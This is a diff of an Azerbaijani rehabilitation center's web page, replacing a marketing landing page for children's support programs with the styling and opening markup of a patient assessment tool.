@@ -1,952 +1,212 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AN Psixoloji Dəstək və Reabilitasiya Mərkəzi</title>
-<meta name="description" content="Xüsusi qayğıya ehtiyacı olan uşaqlar üçün icma əsaslı inteqrasiya və uzaqdan dəstək proqramları. AN Psixoloji Dəstək və Reabilitasiya Mərkəzi, Bakı.">
-
-<!-- ============ XARİCİ KİTABXANALAR (yalnız FontAwesome + Google Fonts) ============ -->
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-
-<style>
-/* ============================================================
-   RƏNG SİSTEMİ VƏ ƏSAS DƏYİŞƏNLƏR
-   ============================================================ */
-:root{
-  --bg:#FFF9F5;          /* ümumi fon */
-  --card:#FEF3E8;        /* kartlar */
-  --stat:#E0F2E9;        /* statistika bloku */
-  --btn:#F49B7B;         /* düymələr */
-  --btn-dark:#e07e5c;    /* düymə hover */
-  --accent:#2A9D8F;      /* vurğular */
-  --accent-dark:#21806f; /* vurğu hover */
-  --yellow:#FFD166;      /* aksanlar */
-  --text:#3a3a3a;        /* mətn */
-  --muted:#6b6b6b;       /* solğun mətn */
-  --white:#ffffff;
-  --shadow:0 10px 30px rgba(244,155,123,.18);
-  --shadow-soft:0 6px 18px rgba(0,0,0,.06);
-  --radius:22px;
-}
-
-/* ============================================================
-   ƏSAS SIFIRLAMALAR
-   ============================================================ */
-*{margin:0;padding:0;box-sizing:border-box}
-html{scroll-behavior:smooth}
-body{
-  font-family:'Inter',sans-serif;
-  background:var(--bg);
-  color:var(--text);
-  line-height:1.7;
-  overflow-x:hidden;            /* üfüqi sürüşmə qadağan */
-}
-h1,h2,h3,.brand{font-family:'Comfortaa',cursive;font-weight:700}
-a{text-decoration:none;color:inherit}
-img{max-width:100%}
-section{padding:70px 0}
-.container{width:100%;max-width:1140px;margin:0 auto;padding:0 20px}
-
-/* ============================================================
-   DÜYMƏLƏR (dairəvi, böyük, yumşaq kölgəli, animasiyalı)
-   ============================================================ */
-.btn{
-  display:inline-flex;align-items:center;gap:10px;
-  border:none;cursor:pointer;
-  font-family:'Comfortaa',cursive;font-weight:600;font-size:1.05rem;
-  padding:15px 32px;border-radius:50px;
-  transition:transform .25s ease, box-shadow .25s ease, background .25s ease;
-}
-.btn-primary{background:var(--btn);color:#fff;box-shadow:var(--shadow)}
-.btn-primary:hover{background:var(--btn-dark);transform:translateY(-4px) scale(1.03);box-shadow:0 16px 34px rgba(244,155,123,.32)}
-.btn-accent{background:var(--accent);color:#fff;box-shadow:0 10px 26px rgba(42,157,143,.25)}
-.btn-accent:hover{background:var(--accent-dark);transform:translateY(-4px) scale(1.03)}
-.btn-ghost{background:#fff;color:var(--accent);border:2px solid var(--accent)}
-.btn-ghost:hover{background:var(--accent);color:#fff;transform:translateY(-3px)}
-
-/* ============================================================
-   HEADER
-   ============================================================ */
-header{
-  position:sticky;top:0;z-index:100;
-  background:rgba(255,249,245,.92);
-  backdrop-filter:blur(10px);
-  box-shadow:var(--shadow-soft);
-}
-.nav{display:flex;align-items:center;justify-content:space-between;gap:18px;padding:14px 0;flex-wrap:wrap}
-.brand{display:flex;align-items:center;gap:12px;font-size:1.15rem;color:var(--accent);line-height:1.25}
-.brand .icons{display:flex;gap:6px;font-size:1.4rem}
-.brand .icons i:nth-child(1){color:var(--btn)}
-.brand .icons i:nth-child(2){color:var(--yellow)}
-.brand .icons i:nth-child(3){color:var(--accent)}
-.brand-name{max-width:230px}
-.nav-actions{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
-.nav-phone{
-  display:inline-flex;align-items:center;gap:8px;
-  background:var(--stat);color:var(--accent-dark);
-  padding:10px 18px;border-radius:50px;font-weight:600;font-size:1.05rem;
-  transition:transform .2s;
-}
-.nav-phone:hover{transform:translateY(-2px)}
-.nav-ig{
-  display:inline-flex;align-items:center;justify-content:center;
-  width:46px;height:46px;border-radius:50%;font-size:1.3rem;color:#fff;
-  background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
-  transition:transform .25s;
-}
-.nav-ig:hover{transform:translateY(-3px) rotate(-6deg)}
-
-/* ============================================================
-   HERO
-   ============================================================ */
-.hero{
-  background:radial-gradient(circle at 20% 20%, #FEF3E8 0%, transparent 55%),
-             radial-gradient(circle at 85% 30%, #E0F2E9 0%, transparent 50%),
-             var(--bg);
-  text-align:center;position:relative;overflow:hidden;
-  padding:90px 0 80px;
-}
-/* Hero arxa fonunda üzən yumşaq formalar */
-.blob{position:absolute;border-radius:50%;filter:blur(2px);opacity:.5;z-index:0;animation:float 7s ease-in-out infinite}
-.blob.b1{width:120px;height:120px;background:var(--yellow);top:40px;left:6%}
-.blob.b2{width:90px;height:90px;background:var(--btn);bottom:60px;right:8%;animation-delay:1.5s}
-.blob.b3{width:60px;height:60px;background:var(--accent);top:120px;right:22%;animation-delay:.8s}
-@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-22px)}}
-.hero .container{position:relative;z-index:1}
-.hero h1{font-size:2.7rem;color:var(--accent-dark);line-height:1.3;margin-bottom:20px}
-.hero h1 .hl{color:var(--btn)}
-.hero p.lead{font-size:1.2rem;color:var(--muted);max-width:720px;margin:0 auto 34px}
-.hero-badges{display:flex;justify-content:center;gap:14px;flex-wrap:wrap;margin-top:36px}
-.hero-badge{background:#fff;border-radius:50px;padding:10px 20px;font-size:.95rem;box-shadow:var(--shadow-soft);display:flex;align-items:center;gap:8px}
-.hero-badge i{color:var(--accent)}
-
-/* ============================================================
-   ÜMUMİ BAŞLIQLAR
-   ============================================================ */
-.section-head{text-align:center;max-width:740px;margin:0 auto 50px}
-.eyebrow{
-  display:inline-block;background:var(--stat);color:var(--accent-dark);
-  font-family:'Comfortaa',cursive;font-weight:600;font-size:.85rem;
-  padding:7px 18px;border-radius:50px;margin-bottom:16px;
-}
-.section-head h2{font-size:2.1rem;color:var(--accent-dark);margin-bottom:14px}
-.section-head p{color:var(--muted);font-size:1.05rem}
-
-/* ============================================================
-   PROYEKT HAQQINDA
-   ============================================================ */
-.about{background:var(--bg)}
-.about-text{max-width:880px;margin:0 auto}
-.about-text p{margin-bottom:18px;font-size:1.06rem;color:#444}
-.models{display:grid;grid-template-columns:1fr 1fr;gap:26px;margin:40px 0}
-.model-card{
-  background:var(--card);border-radius:var(--radius);padding:30px;
-  box-shadow:var(--shadow-soft);transition:transform .3s, box-shadow .3s;
-  border-top:6px solid var(--btn);
-}
-.model-card:nth-child(2){border-top-color:var(--accent)}
-.model-card:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
-.model-card .tag{
-  display:inline-block;background:#fff;border-radius:50px;padding:5px 14px;
-  font-size:.8rem;font-weight:600;color:var(--btn);margin-bottom:14px;
-}
-.model-card:nth-child(2) .tag{color:var(--accent)}
-.model-card h3{font-size:1.3rem;margin-bottom:10px;color:#333;display:flex;align-items:center;gap:10px}
-.model-card h3 i{font-size:1.6rem}
-.model-card:nth-child(1) h3 i{color:var(--btn)}
-.model-card:nth-child(2) h3 i{color:var(--accent)}
-.model-card ul{list-style:none;margin-top:14px}
-.model-card li{padding:7px 0 7px 28px;position:relative;color:#555;font-size:.98rem}
-.model-card li::before{content:"\f00c";font-family:"Font Awesome 6 Free";font-weight:900;position:absolute;left:0;color:var(--accent)}
-
-/* Avadanlıq qutusu vurğu bloku */
-.kit-box{
-  background:#fff;border-radius:var(--radius);padding:26px 30px;margin:30px 0;
-  border-left:6px solid var(--yellow);box-shadow:var(--shadow-soft);
-  display:flex;gap:20px;align-items:center;flex-wrap:wrap;
-}
-.kit-box .kit-icon{font-size:2.6rem;color:var(--yellow)}
-.kit-box .kit-body{flex:1;min-width:240px}
-.kit-box h3{color:var(--accent-dark);margin-bottom:6px}
-
-/* Statistika */
-.stats{background:var(--stat);border-radius:var(--radius);padding:46px 30px;margin:40px 0}
-.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;text-align:center}
-.stat-item .num{font-family:'Comfortaa',cursive;font-weight:700;font-size:2.6rem;color:var(--accent-dark)}
-.stat-item .label{color:#4a6b62;font-size:.95rem;margin-top:6px}
-
-/* Valideyn rəyi */
-.testimonial{
-  background:var(--card);border-radius:var(--radius);padding:36px 40px;margin-top:40px;
-  position:relative;box-shadow:var(--shadow-soft);max-width:820px;margin-left:auto;margin-right:auto;
-}
-.testimonial .quote-mark{font-size:3.4rem;color:var(--btn);opacity:.35;line-height:0;position:absolute;top:30px;left:24px}
-.testimonial p{font-size:1.15rem;font-style:italic;color:#444;padding-left:40px;margin-bottom:16px}
-.testimonial .author{display:flex;align-items:center;gap:12px;padding-left:40px}
-.testimonial .avatar{width:44px;height:44px;border-radius:50%;background:var(--btn);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700}
-.testimonial .author b{color:var(--accent-dark)}
-
-/* ============================================================
-   TESTLƏR
-   ============================================================ */
-.tests{background:var(--card)}
-.tests-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:22px}
-.test-card{
-  background:#fff;border-radius:var(--radius);padding:26px;
-  box-shadow:var(--shadow-soft);transition:transform .3s, box-shadow .3s;
-  text-align:center;
-}
-.test-card:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
-.test-card .ti{
-  width:64px;height:64px;border-radius:50%;margin:0 auto 16px;
-  display:flex;align-items:center;justify-content:center;font-size:1.6rem;color:#fff;
-  background:var(--accent);
-}
-.test-card:nth-child(2) .ti{background:var(--btn)}
-.test-card:nth-child(3) .ti{background:var(--yellow);color:#7a5a00}
-.test-card:nth-child(4) .ti{background:var(--accent)}
-.test-card:nth-child(5) .ti{background:var(--btn)}
-.test-card h3{font-size:1.1rem;margin-bottom:8px;color:#333}
-.test-card p{font-size:.93rem;color:var(--muted)}
-.tests-cta{text-align:center;margin-top:40px}
-
-/* ============================================================
-   ƏLAQƏ
-   ============================================================ */
-.contact{background:var(--bg)}
-.contact-grid{display:grid;grid-template-columns:1fr 1fr;gap:34px;align-items:start}
-.contact-info .info-item{
-  display:flex;gap:16px;align-items:flex-start;
-  background:var(--card);border-radius:18px;padding:20px 22px;margin-bottom:16px;
-  box-shadow:var(--shadow-soft);transition:transform .25s;
-}
-.contact-info .info-item:hover{transform:translateX(6px)}
-.contact-info .ic{
-  width:50px;height:50px;border-radius:14px;flex:none;
-  display:flex;align-items:center;justify-content:center;font-size:1.3rem;color:#fff;background:var(--accent);
-}
-.contact-info .info-item:nth-child(2) .ic{background:var(--btn)}
-.contact-info .info-item:nth-child(3) .ic{background:linear-gradient(45deg,#f09433,#dc2743,#bc1888)}
-.contact-info .info-item .label{font-size:.85rem;color:var(--muted)}
-.contact-info .info-item .value{font-size:1.2rem;font-weight:600;color:#333;word-break:break-word}
-.contact-info .info-item .value.addr{font-size:1.1rem}
-.maps-btn{margin-top:8px;width:100%;justify-content:center}
-
-/* Formalar */
-.form-card{background:var(--card);border-radius:var(--radius);padding:34px;box-shadow:var(--shadow-soft)}
-.form-card h3{color:var(--accent-dark);margin-bottom:6px;font-size:1.4rem}
-.form-card .sub{color:var(--muted);margin-bottom:22px;font-size:.95rem}
-.field{margin-bottom:18px}
-.field label{display:block;font-weight:600;font-size:.92rem;margin-bottom:7px;color:#444}
-.field input,.field textarea,.field select{
-  width:100%;padding:13px 16px;border:2px solid #f1e4d8;border-radius:14px;
-  font-family:'Inter',sans-serif;font-size:1rem;background:#fff;color:var(--text);
-  transition:border-color .2s, box-shadow .2s;
-}
-.field input:focus,.field textarea:focus,.field select:focus{
-  outline:none;border-color:var(--accent);box-shadow:0 0 0 4px rgba(42,157,143,.12);
-}
-.field textarea{resize:vertical;min-height:120px}
-.form-msg{margin-top:14px;padding:12px 16px;border-radius:12px;display:none;font-size:.95rem}
-.form-msg.ok{display:block;background:var(--stat);color:var(--accent-dark)}
-
-/* ============================================================
-   QEYDİYYAT
-   ============================================================ */
-.register{background:var(--stat)}
-.register .form-card{background:#fff;max-width:680px;margin:0 auto}
-.register-2col{display:grid;grid-template-columns:1fr 1fr;gap:18px}
-
-/* ============================================================
-   ADMIN
-   ============================================================ */
-.admin-launch{background:var(--bg);text-align:center;padding:40px 0 70px}
-.admin-launch p{color:var(--muted);margin-bottom:16px}
-
-/* Modal */
-.modal-overlay{
-  display:none;position:fixed;inset:0;z-index:1000;
-  background:rgba(42,40,40,.55);backdrop-filter:blur(4px);
-  align-items:flex-start;justify-content:center;padding:30px 16px;overflow-y:auto;
-}
-.modal-overlay.open{display:flex}
-.modal{
-  background:var(--bg);border-radius:var(--radius);width:100%;max-width:760px;
-  box-shadow:0 30px 70px rgba(0,0,0,.3);animation:pop .3s ease;
-  margin:auto;
-}
-@keyframes pop{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
-.modal-head{
-  display:flex;align-items:center;justify-content:space-between;
-  padding:22px 26px;border-bottom:2px solid #f1e4d8;
-}
-.modal-head h3{color:var(--accent-dark);font-size:1.3rem}
-.modal-close{background:none;border:none;font-size:1.5rem;cursor:pointer;color:var(--muted);width:40px;height:40px;border-radius:50%;transition:background .2s}
-.modal-close:hover{background:#f1e4d8}
-.modal-body{padding:24px 26px;max-height:70vh;overflow-y:auto}
-
-/* Admin giriş */
-.login-box .field{margin-bottom:16px}
-.login-error{color:#c0392b;font-size:.9rem;margin-bottom:10px;display:none}
-.login-error.show{display:block}
-
-/* Admin tablar */
-.admin-tabs{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap}
-.admin-tab{
-  border:none;cursor:pointer;background:#fff;color:var(--muted);
-  padding:9px 18px;border-radius:50px;font-family:'Comfortaa',cursive;font-weight:600;font-size:.9rem;
-  box-shadow:var(--shadow-soft);transition:all .2s;
-}
-.admin-tab.active{background:var(--accent);color:#fff}
-.tab-pane{display:none}
-.tab-pane.active{display:block}
-
-/* Mesaj kartı */
-.msg-card{
-  background:#fff;border-radius:16px;padding:18px 20px;margin-bottom:14px;
-  box-shadow:var(--shadow-soft);border-left:5px solid var(--btn);
-}
-.msg-card.read{border-left-color:var(--accent);opacity:.92}
-.msg-top{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:8px}
-.msg-top .who{font-weight:700;color:#333}
-.msg-top .who a{color:var(--accent-dark)}
-.msg-status{font-size:.75rem;padding:3px 10px;border-radius:50px;background:#ffe8de;color:var(--btn-dark);font-weight:600}
-.msg-card.read .msg-status{background:var(--stat);color:var(--accent-dark)}
-.msg-date{font-size:.8rem;color:var(--muted)}
-.msg-text{color:#444;margin:8px 0;font-size:.97rem}
-.msg-reply{background:var(--stat);border-radius:12px;padding:10px 14px;margin:10px 0;font-size:.92rem;color:var(--accent-dark)}
-.msg-reply b{display:block;font-size:.78rem;margin-bottom:3px;opacity:.8}
-.msg-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
-.mini-btn{
-  border:none;cursor:pointer;font-size:.82rem;font-weight:600;
-  padding:8px 14px;border-radius:50px;transition:all .2s;display:inline-flex;align-items:center;gap:6px;
-}
-.mini-btn.read-b{background:var(--stat);color:var(--accent-dark)}
-.mini-btn.del-b{background:#ffe0e0;color:#c0392b}
-.mini-btn.reply-b{background:var(--btn);color:#fff}
-.mini-btn:hover{transform:translateY(-2px)}
-.reply-area{display:none;margin-top:10px}
-.reply-area.open{display:block}
-.reply-area textarea{width:100%;padding:10px 14px;border:2px solid #f1e4d8;border-radius:12px;font-family:'Inter',sans-serif;resize:vertical;min-height:60px}
-.empty-state{text-align:center;color:var(--muted);padding:40px 10px}
-.empty-state i{font-size:2.5rem;color:#e0d4c8;margin-bottom:12px;display:block}
-
-/* ============================================================
-   FOOTER
-   ============================================================ */
-footer{background:var(--accent-dark);color:#e8f4f1;text-align:center;padding:46px 0 30px}
-footer .f-brand{font-family:'Comfortaa',cursive;font-size:1.3rem;margin-bottom:10px;color:#fff;display:flex;align-items:center;justify-content:center;gap:10px}
-footer .f-credit{margin:14px 0}
-footer .f-credit a{
-  color:var(--yellow);font-weight:600;display:inline-flex;align-items:center;gap:7px;
-  transition:opacity .2s;
-}
-footer .f-credit a:hover{opacity:.8}
-footer .f-rights{font-size:.85rem;opacity:.75;margin-top:8px}
-
-/* ============================================================
-   RESPONSIVE
-   ============================================================ */
-@media(max-width:860px){
-  .models{grid-template-columns:1fr}
-  .stats-grid{grid-template-columns:repeat(2,1fr)}
-  .contact-grid{grid-template-columns:1fr}
-  .hero h1{font-size:2.1rem}
-}
-@media(max-width:560px){
-  section{padding:50px 0}
-  .nav{justify-content:center;text-align:center}
-  .brand-name{max-width:100%;font-size:.95rem}
-  .hero h1{font-size:1.7rem}
-  .hero p.lead{font-size:1.05rem}
-  .stats-grid{grid-template-columns:1fr 1fr}
-  .stat-item .num{font-size:2.1rem}
-  .register-2col{grid-template-columns:1fr}
-  .section-head h2{font-size:1.6rem}
-  .testimonial p,.testimonial .author{padding-left:10px}
-  .testimonial .quote-mark{display:none}
-  .form-card{padding:24px}
-}
-@media (prefers-reduced-motion: reduce){
-  *{animation:none !important;transition:none !important;scroll-behavior:auto !important}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <meta name="copyright" content="AN Psixoloji Dəstək və Reabilitasiya Mərkəzi">
+    <title>AN Psixoloji Dəstək və Reabilitasiya Mərkəzi - TTAP Professional Plus</title>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #c8e6f5, #e1f0fa);
+            margin: 0;
+            padding: 16px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 20px 24px;
+        }
+        @media (max-width: 768px) {
+            body { padding: 12px; }
+            .container { padding: 16px; border-radius: 28px; }
+            h2 { font-size: 1.3rem; }
+            h3 { font-size: 1.1rem; }
+            .flex-row { flex-direction: column; }
+            button { width: 100%; margin-bottom: 8px; }
+            .card { flex-direction: column; align-items: stretch; }
+            th, td { font-size: 0.7rem; padding: 6px 3px; }
+            .result-badge { padding: 16px; }
+        }
+        h2 {
+            background: linear-gradient(135deg, #FF8C42, #F57C00);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            border-left: 6px solid #FF8C42;
+            padding-left: 18px;
+            margin-top: 0;
+        }
+        h3 {
+            color: #2c6e9e;
+            margin-top: 25px;
+            margin-bottom: 12px;
+            border-bottom: 3px dotted #FFB74D;
+            display: inline-block;
+            padding-bottom: 5px;
+        }
+        .copyright {
+            text-align: center;
+            margin-top: 40px;
+            padding: 12px;
+            background: #f7f2e0;
+            border-radius: 50px;
+            color: #8B5E3C;
+            font-size: 0.7rem;
+        }
+        input, select {
+            padding: 12px 16px;
+            width: 100%;
+            border: 2px solid #FFD966;
+            border-radius: 60px;
+            font-size: 1rem;
+            background: #FFFEF7;
+        }
+        button {
+            background: linear-gradient(135deg, #43A047, #2E7D32);
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 60px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.1s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        button:hover { transform: scale(0.97); opacity: 0.9; }
+        button.danger { background: linear-gradient(135deg, #E57373, #C62828); }
+        button.secondary { background: linear-gradient(135deg, #FFB74D, #F57C00); }
+        button.html-btn, button.image-btn { font-size: 0.7rem; padding: 5px 10px; width: auto; }
+        button.html-btn { background: linear-gradient(135deg, #FF8C42, #E65100); }
+        button.image-btn { background: linear-gradient(135deg, #8E24AA, #6A1B9A); }
+        .card {
+            background: #FFF9E6;
+            border-left: 10px solid #FFD966;
+            padding: 12px 18px;
+            margin: 12px 0;
+            border-radius: 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .patient-name {
+            font-weight: bold;
+            color: #2c6e9e;
+            background: #E8F0FE;
+            padding: 5px 16px;
+            border-radius: 50px;
+        }
+        .test-card {
+            background: #F6F9FF;
+            border-left-color: #7CB342;
+            display: block;
+        }
+        .test-question { font-weight: 700; margin-bottom: 8px; color: #1e4a76; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 24px;
+            display: block;
+            overflow-x: auto;
+        }
+        th, td {
+            border-bottom: 1px solid #FFE0A3;
+            padding: 10px 6px;
+            text-align: left;
+        }
+        th { background: #FFE8B5; color: #5D3A1A; }
+        .result-badge {
+            background: linear-gradient(135deg, #E8F5E9, #DCEDC8);
+            padding: 20px;
+            border-radius: 32px;
+            margin: 20px 0;
+            border: 2px solid #A5D6A7;
+            overflow-x: auto;
+        }
+        .detail-box {
+            background: #FFF3E0;
+            padding: 16px;
+            border-radius: 28px;
+            margin: 15px 0;
+            border-left: 6px solid #FFB74D;
+        }
+        .flex-row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
+        .section-header {
+            background: linear-gradient(135deg, #FFE4B5, #FFD966);
+            padding: 8px 18px;
+            border-radius: 40px;
+            margin: 20px 0 12px;
+            font-weight: bold;
+            color: #5D3A1A;
+        }
+        .progress-bar { background: #E8E0C8; border-radius: 30px; height: 10px; margin: 6px 0; }
+        .progress-fill { background: linear-gradient(90deg, #66BB6A, #2E7D32); height: 100%; border-radius: 30px; }
+        .strength-item { background: #E8F5E9; color: #2E7D32; padding: 4px 10px; border-radius: 30px; display: inline-block; margin: 3px; font-size: 0.75rem; }
+        .weakness-item { background: #FFEBEE; color: #C62828; padding: 4px 10px; border-radius: 30px; display: inline-block; margin: 3px; font-size: 0.75rem; }
+        .delete-test-btn { background: #ff8a65; padding: 5px 12px; border-radius: 30px; font-size: 0.7rem; border: none; color: white; cursor: pointer; }
+        .career-cat { background: #FFF8E1; border-left: 5px solid #FF9800; padding: 12px; margin: 12px 0; border-radius: 20px; }
+        .prof-list { margin: 8px 0 0 20px; font-size: 0.85rem; }
+        .edu-box { background: #E3F2FD; padding: 12px; border-radius: 24px; margin: 12px 0; border-left: 5px solid #2196F3; }
+        .higher-box { background: #EDE7F6; padding: 12px; border-radius: 24px; margin: 12px 0; border-left: 5px solid #5E35B1; }
+        .parent-tip { background: #FFF9C4; padding: 12px; border-radius: 24px; margin: 12px 0; border-left: 5px solid #F9A825; }
+        .warning-note { background: #FFEBEE; padding: 12px; border-radius: 20px; border-left: 5px solid #F44336; }
+        .university-item { background: white; border-radius: 16px; padding: 10px; margin: 8px 0; }
+        .welcome-emoji { font-size: 2rem; text-align: center; }
+    </style>
 </head>
-
 <body>
+<div class="container">
+    <div class="welcome-emoji">🧸📋✨</div>
+    <h2>🧸 AN Psixoloji Dəstək və Reabilitasiya Mərkəzi</h2>
+    <p style="font-size:0.9rem;"><strong>✨ TTAP Professional Plus – Çoxsahəli Peşə Yönümlü Qiymətləndirmə ✨</strong><br>İş bacarıqları, sosial, koqnitiv, gündəlik həyat, sensor-motor və <strong>loqopedik (nitq)</strong> bölmələri.</p>
 
-<!-- ============================================================
-     HEADER
-     ============================================================ -->
-<header>
-  <div class="container nav">
-    <a href="#hero" class="brand">
-      <span class="icons"><i class="fa-solid fa-children"></i><i class="fa-solid fa-heart"></i><i class="fa-solid fa-puzzle-piece"></i></span>
-      <span class="brand-name">AN Psixoloji Dəstək və Reabilitasiya Mərkəzi</span>
-    </a>
-    <div class="nav-actions">
-      <a href="tel:+994554157215" class="nav-phone"><i class="fa-solid fa-phone"></i> +994 55 415 72 15</a>
-      <a href="https://www.instagram.com/an_psixologiyamerkezi?igsh=aTQ4NHNoMzlnc3dz" target="_blank" rel="noopener" class="nav-ig" aria-label="Instagram"><i class="fa-brands fa-instagram"></i></a>
-    </div>
-  </div>
-</header>
-
-<!-- ============================================================
-     HERO
-     ============================================================ -->
-<section class="hero" id="hero">
-  <span class="blob b1"></span><span class="blob b2"></span><span class="blob b3"></span>
-  <div class="container">
-    <h1>Güclü tərəfləri <span class="hl">kəşf edir</span>,<br>cəmiyyətə birləşdiririk</h1>
-    <p class="lead">İcma əsaslı inteqrasiya + uzaqdan dəstək proqramları ilə hər bir uşağın potensialını açırıq.</p>
-    <a href="#register" class="btn btn-primary"><i class="fa-solid fa-hand-holding-heart"></i> Pulsuz ilkin məsləhət</a>
-    <div class="hero-badges">
-      <span class="hero-badge"><i class="fa-solid fa-people-group"></i> İcma əsaslı inteqrasiya</span>
-      <span class="hero-badge"><i class="fa-solid fa-laptop-house"></i> Uzaqdan dəstək</span>
-      <span class="hero-badge"><i class="fa-solid fa-box-open"></i> Evə avadanlıq qutusu</span>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     PROYEKT HAQQINDA
-     ============================================================ -->
-<section class="about" id="about">
-  <div class="container">
-    <div class="section-head">
-      <span class="eyebrow">Proqram haqqında</span>
-      <h2>Hər uşaq bir imkandır</h2>
-      <p>Biz uşağı diaqnozu ilə deyil, bacarıqları ilə görürük.</p>
-    </div>
-
-    <div class="about-text">
-      <p>AN Psixoloji Dəstək və Reabilitasiya Mərkəzi xüsusi qayğıya ehtiyacı olan uşaqlarla — autizm, inkişaf geriliyi, sensor pozuntular və oxşar xüsusiyyətlərlə — işləyir. Bizim yanaşmamızın özəyində sadə, lakin güclü bir inam dayanır: hər uşağın güclü tərəfləri var və düzgün dəstəklə bu güclü tərəflər çiçəklənə bilər. Biz “xəstəlik” dilindən imtina edirik; əvəzində uşağın nəyi bacardığını, nəyi sevdiyini və hansı sahədə parladığını tapırıq.</p>
-
-      <p>Mərkəzimiz dünyada müsbət nəticələrini sübut etmiş, lakin Azərbaycanda hələ tam tanınmayan iki qabaqcıl modeli birləşdirir. Bu birləşmə sayəsində həm Bakıda yaşayan, həm də regionlarda — mərkəzə gəlmək imkanı olmayan — ailələrə bərabər keyfiyyətli dəstək təklif edirik.</p>
-
-      <div class="models">
-        <!-- Model B -->
-        <div class="model-card">
-          <span class="tag">Böyük Britaniya nümunəsi</span>
-          <h3><i class="fa-solid fa-people-arrows"></i> İcma Əsaslı İnteqrasiya</h3>
-          <p>Uşağı “qüsurlu” kimi görmək əvəzinə onun güclü tərəflərini tapıb real cəmiyyətə inteqrasiya edirik. Uşaqlar psixoloq və mentorların müşayiəti ilə real həyatın içinə çıxır.</p>
-          <ul>
-            <li>Kitabxanalara, kafelərə, idman klublarına və muzeylərə birgə gəzintilər</li>
-            <li>Sosial təcridin aradan qaldırılması</li>
-            <li>“Uşağımın normal dostları olacaqmı?” sualına real cavab</li>
-            <li>Gündəlik bacarıqların təbii mühitdə öyrənilməsi</li>
-          </ul>
+    <div style="background:#FFF0D4; border-radius: 48px; padding: 16px 20px; margin-bottom: 28px;">
+        <h3 style="margin-top:0;">➕ Yeni pasiyent</h3>
+        <div class="flex-row">
+            <input type="text" id="patientName" placeholder="Ad Soyad" style="flex:2;">
+            <input type="number" id="patientAge" placeholder="Yaş" style="flex:1;">
+            <button onclick="window.addNewPatient()">Əlavə et</button>
         </div>
-        <!-- Model C -->
-        <div class="model-card">
-          <span class="tag">Kanada nümunəsi</span>
-          <h3><i class="fa-solid fa-laptop-house"></i> Hiper-Lokalizasiya və Uzaqdan Dəstək</h3>
-          <p>Fiziki olaraq mərkəzə gələ bilməyən ailələr — Bakı ətrafı qəsəbələr və regionlar — üçün onlayn koçluq. Coğrafi məsafə artıq maneə deyil.</p>
-          <ul>
-            <li>Hər ailəyə evə xüsusi avadanlıq qutusu göndərilir</li>
-            <li>Həftəlik onlayn koçluq sessiyaları</li>
-            <li>Valideyn üçün addım-addım təlimat</li>
-            <li>Regionlardakı ailələr üçün bərabər fürsət</li>
-          </ul>
+    </div>
+
+    <h3>📋 Pasiyentlər</h3>
+    <div id="patientsList"></div>
+
+    <div id="testPanel" style="display: none; margin-top: 28px;">
+        <hr>
+        <div class="flex-row" style="justify-content: space-between;">
+            <h3 id="testPatientTitle" style="margin:0;">🧪 Test</h3>
+            <button class="secondary" onclick="window.cancelTest()">✖ Bağla</button>
         </div>
-      </div>
-
-      <!-- Avadanlıq qutusu -->
-      <div class="kit-box">
-        <i class="fa-solid fa-box-open kit-icon"></i>
-        <div class="kit-body">
-          <h3>Evə gələn dəstək qutusu</h3>
-          <p>Uzaqdan dəstək alan hər ailə qapısına qədər çatdırılan xüsusi qutu alır: sensor toplar, Play-Doh, rəngli fəaliyyət kartları və koçumuzun hazırladığı həftəlik məşğələ planı. Beləliklə, onlayn sessiya başlayanda uşağın əlində ehtiyac duyduğu hər şey artıq hazır olur.</p>
+        <div class="detail-box">
+            <label>📅 Test tarixi:</label>
+            <input type="datetime-local" id="testDateInput" style="width: auto; min-width: 200px;">
         </div>
-      </div>
-
